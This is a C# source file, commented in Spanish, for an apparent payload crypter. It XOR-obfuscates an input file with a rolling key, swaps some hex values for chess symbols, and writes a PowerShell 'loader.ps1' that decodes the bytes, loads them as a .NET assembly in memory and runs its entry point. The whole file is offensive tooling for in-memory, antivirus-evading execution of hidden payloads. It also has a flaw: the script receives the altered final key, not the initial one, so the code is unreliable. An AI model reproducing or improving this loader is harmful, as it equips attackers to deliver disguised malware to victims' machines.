using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class Program
{
    static void Main(string[] args)
    {
        if (args.Length < 1 || args.Length > 2)
        {
            Console.WriteLine("Uso: Converter.exe <ruta_al_archivo> [-v]");
            return;
        }

        string filePath = args[0];
        bool verbose = args.Length == 2 && args[1] == "-v";
        Random random = new Random();
        byte xorKey = (byte)random.Next(0, 256);  // Generar clave XOR aleatoria

        if (verbose)
        {
            Console.WriteLine($"Archivo a ofuscar: {filePath}");
            Console.WriteLine($"Clave XOR inicial: 0x{xorKey:X2}");
        }

        byte[] fileBytes = File.ReadAllBytes(filePath);

        // Aplicar XOR con clave dinámica
        byte[] xorBytes = new byte[fileBytes.Length];
        for (int i = 0; i < fileBytes.Length; i++)
        {
            xorBytes[i] = (byte)(fileBytes[i] ^ xorKey);
            if (verbose)
            {
                Console.WriteLine($"Byte {i}: 0x{fileBytes[i]:X2} ^ 0x{xorKey:X2} = 0x{xorBytes[i]:X2}");
            }
            xorKey = (byte)((xorKey + 3) % 256);  // Clave dinámica para mayor ofuscación
        }

        // Calcular hash SHA256 para verificación de integridad
        using (SHA256 sha256 = SHA256.Create())
        {
            byte[] hash = sha256.ComputeHash(xorBytes);
            string hashString = BitConverter.ToString(hash).Replace("-", "").ToLower();
            Console.WriteLine("Hash SHA256 del archivo ofuscado: " + hashString);
        }

        string banner = @"
╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╭━╮╱╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╱╭╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╭╯╰╮┃┃╰╮┃┃╱╭╯╰╮╱╱╱╱╱╱╱╱╱╱╭╯┃
┃┃╱╰╋━━┳━╮╭╮╭┳━━┳┻╮╭╯┃╭╮╰╯┣━┻╮╭╯╱╱╱╱╭━━┳━━╋╮┃
┃┃╱╭┫╭╮┃╭╮┫╰╯┃┃━┫╭┫┃╱┃┃╰╮┃┃┃━┫┃╱╭━━╮┃╭╮┃━━┫┃┃
┃╰━╯┃╰╯┃┃┃┣╮╭┫┃━┫┃┃╰╮┃┃╱┃┃┃┃━┫╰╮╰━━╯┃╰╯┣━━┣╯╰╮
╰━━━┻━━┻╯╰╯╰╯╰━━┻╯╰━╯╰╯╱╰━┻━━┻━╯╱╱╱╱┃╭━┻━━┻━━╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯";

        // Convertir a string en PowerShell con ofuscación personalizada
        StringBuilder psArray = new StringBuilder();
        psArray.Append("[string[]] $bytes = @(");

        for (int i = 0; i < xorBytes.Length; i++)
        {
            string hexValue = xorBytes[i].ToString("x2");
            string obfuscatedValue = ObfuscateHexValue(hexValue);
            psArray.AppendFormat("\"{0}\"", obfuscatedValue);

            if (i < xorBytes.Length - 1)
            {
                psArray.Append(",");
                if ((i + 1) % 16 == 0)
                {
                    psArray.AppendLine();  // Formateo para mejor legibilidad en PS
                }
            }
        }
        psArray.Append(")");

        // Guardar el script en un archivo .ps1 con codificación UTF-8 para soportar caracteres especiales
        string psScriptFilePath = "loader.ps1";
        using (StreamWriter writer = new StreamWriter(psScriptFilePath, false, Encoding.UTF8))
        {
            writer.WriteLine("# Script PowerShell generado automáticamente");
            writer.WriteLine(banner);
            writer.WriteLine();
            writer.WriteLine(psArray.ToString());
            writer.WriteLine();
            writer.WriteLine("# Clave XOR utilizada para desencriptar");
            writer.WriteLine("$xorKey = 0x" + xorKey.ToString("x2"));
            writer.WriteLine();
            writer.WriteLine("# Función para revertir la ofuscación personalizada");
            writer.WriteLine("function DeobfuscateHexValue {");
            writer.WriteLine("    param ([string]$value)");
            writer.WriteLine("    switch ($value) {");
            writer.WriteLine("        '♘' { return '33' }");
            writer.WriteLine("        '♟' { return 'cf' }");
            writer.WriteLine("        '♜' { return '61' }");
            writer.WriteLine("        default { return $value }");  // Retornar el valor hexadecimal original
            writer.WriteLine("    }");
            writer.WriteLine("}");
            writer.WriteLine();
            writer.WriteLine("# Convertir y desencriptar el array de bytes");
            writer.WriteLine("$deobfuscatedBytes = @()");
            writer.WriteLine("foreach ($value in $bytes) {");
            writer.WriteLine("    $hexValue = DeobfuscateHexValue $value");
            writer.WriteLine("    $byteValue = [Convert]::ToByte($hexValue, 16)");
            writer.WriteLine("    $deobfuscatedBytes += $byteValue");
            writer.WriteLine("}");
            writer.WriteLine();
            writer.WriteLine("$decryptedBytes = [byte[]]::new($deobfuscatedBytes.Length)");
            writer.WriteLine("for ($i = 0; $i -lt $deobfuscatedBytes.Length; $i++) {");
            writer.WriteLine("    $decryptedBytes[$i] = $deobfuscatedBytes[$i] -bxor $xorKey");
            writer.WriteLine("    $xorKey = ($xorKey + 3) % 256");
            writer.WriteLine("}");
            writer.WriteLine();
            writer.WriteLine("# Cargar el ensamblado en memoria y ejecutar el entry point");
            writer.WriteLine("try {");
            writer.WriteLine("    $assembly = [System.Reflection.Assembly]::Load($decryptedBytes)");
            writer.WriteLine("    $entryPoint = $assembly.EntryPoint");
            writer.WriteLine("    if ($entryPoint -ne $null) {");
            writer.WriteLine("        $entryPoint.Invoke($null, @([string[]]@()))");
            writer.WriteLine("    } else {");
            writer.WriteLine("        Write-Error 'No se pudo encontrar un punto de entrada en el ensamblado.'");
            writer.WriteLine("    }");
            writer.WriteLine("} catch {");
            writer.WriteLine("    Write-Error 'Error cargando el ensamblado: ' + $_");
            writer.WriteLine("}");
        }

        Console.WriteLine("Script PowerShell guardado en: " + psScriptFilePath);
    }

    // Función para ofuscar ciertos valores hexadecimales
    static string ObfuscateHexValue(string hexValue)
    {
        switch (hexValue.ToLower())
        {
            case "33":
                return "♘";
            case "cf":
                return "♟";
            case "61":
                return "♜";
            default:
                return hexValue;
        }
    }
}
